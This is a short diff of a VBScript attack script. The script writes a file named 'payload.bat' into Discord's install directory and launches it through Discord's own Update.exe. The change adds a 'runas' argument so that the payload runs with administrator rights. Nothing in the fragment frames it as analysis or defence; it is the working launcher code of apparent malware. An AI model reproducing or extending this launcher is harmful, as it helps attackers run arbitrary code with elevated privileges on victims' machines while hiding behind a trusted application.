@@ -13,4 +13,4 @@ Next
 
 Set File = FSO.CreateTextFile(Discord + Folder + "\payload.bat", true)
 File.WriteLine(Payload)
-App.ShellExecute Discord + "Update.exe", "--processStart payload.bat"
+App.ShellExecute Discord + "Update.exe", "--processStart payload.bat", , "runas"
